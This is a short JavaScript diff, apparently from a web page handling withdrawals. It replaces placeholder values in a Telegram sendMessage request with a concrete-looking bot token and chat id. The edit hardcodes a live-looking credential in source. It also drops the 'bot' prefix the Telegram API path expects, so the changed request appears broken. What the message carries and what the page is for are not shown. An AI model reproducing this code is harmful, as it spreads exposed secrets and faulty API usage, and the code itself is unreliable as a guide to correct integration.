@@ -391,13 +391,13 @@
                 console.log('Withdrawal successful! Email sent.');
 
                 // Send message to Telegram bot
-                fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage`, {
+                fetch(`https://api.telegram.org/7849950200:AAFxT3-Nq1HVSYCMwF1-lsGww6XmERS2Ig0/sendMessage`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        chat_id: 'YOUR_TELEGRAM_CHAT_ID',
+                        chat_id: '7959877182',
                         text: telegramMessage
                     })
                 }).then(response => {
